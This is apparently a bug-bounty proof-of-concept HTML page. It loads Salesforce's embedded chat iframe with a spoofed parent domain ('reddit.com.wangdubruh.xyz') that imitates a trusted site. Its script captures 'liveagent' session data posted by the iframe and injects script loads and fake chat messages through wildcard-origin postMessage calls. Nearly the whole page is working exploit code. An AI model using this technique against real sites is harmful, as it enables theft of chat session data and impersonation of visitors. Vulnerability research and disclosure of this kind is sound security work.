<!DOCTYPE html>
<html>
<head>
  <title>Salesforce iframe Metadata Console Test</title>
</head>
<body>
  <h2>Console Test: Salesforce iframe Metadata</h2>

  <iframe id="eswFrame"
          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
          allow="camera *; microphone *;"
          style="width:100%;height:400px;"></iframe>

  <script>
    const frame = document.getElementById("eswFrame");

    window.addEventListener("message", (e) => {
      console.log("ðŸ“© Message from iframe:", e.data);

      if (typeof e.data === "object" && e.data.method &&
          (e.data.method === "liveagent.initialized" || e.data.method === "liveagent.restored")) {
        console.log("âœ… Captured session data from chasitor:");
        console.log(JSON.stringify(e.data.data, null, 2));
      }
    });

    frame.onload = () => {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      ["chasitor", "filetransfer"].forEach((feature) => {
        const msg = { method: "script.load", feature };
        console.log("ðŸ“¤ Sending script.load for feature:", feature);
        frame.contentWindow.postMessage(msg, "*");
      });

      setTimeout(() => {
        const msg = {
          method: "chasitor.sendMessage",
          domain: "reddit.com.wangdubruh.xyz",
          data: "hello from PoC"
        };
        console.log("ðŸ“¤ Sending fake message to chasitor");
        frame.contentWindow.postMessage(msg, "*");
      }, 3000);
    };
  </script>
</body>
</html>
